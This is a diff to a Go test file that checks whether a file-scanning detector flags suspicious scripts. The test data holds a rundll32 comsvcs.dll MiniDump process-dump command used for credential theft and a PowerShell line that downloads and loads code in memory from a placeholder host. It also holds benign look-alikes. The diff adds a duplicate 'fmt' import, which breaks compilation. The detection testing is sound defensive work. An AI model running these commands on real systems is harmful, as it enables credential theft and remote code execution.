@@ -3,6 +3,7 @@ package main
 import (
  "encoding/binary"
  "fmt"
+ "fmt"
  "os"
  "path/filepath"
  "strings"
@@ -102,4 +103,24 @@ func TestStage8ReproducibleReportReasonFamilies(t *testing.T) {
  }
  for _,rule:=range benign {if !stage8ContextualRule(rule){t.Errorf("old context-free rule still enabled: %s",rule)}}
  _=strings.Builder{}
+}
+
+
+func TestStage8AdditionalCorrelatedBehaviors(t *testing.T){
+ cases:=[]struct{file,content string;want bool}{
+  {"dump.cmd","rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\Temp\\snapshot.dmp full",true},
+  {"load.ps1","[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://example.invalid/not-real'))",true},
+  {"notes.cmd","echo rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 out.dmp full",false},
+  {"local.ps1","[Reflection.Assembly]::Load($localBytes)",false},
+ }
+ root:=t.TempDir()
+ for i,c:=range cases{
+  dir:=filepath.Join(root,fmt.Sprintf("extra-%d",i))
+  if err:=os.MkdirAll(dir,0700);err!=nil{t.Fatal(err)}
+  p:=filepath.Join(dir,c.file)
+  if err:=os.WriteFile(p,[]byte(c.content),0600);err!=nil{t.Fatal(err)}
+  st,_:=os.Stat(p)
+  f:=inspectFile(p,st)
+  if (f!=nil)!=c.want {t.Errorf("%s want=%v got=%v",c.file,c.want,f!=nil)}
+ }
 }
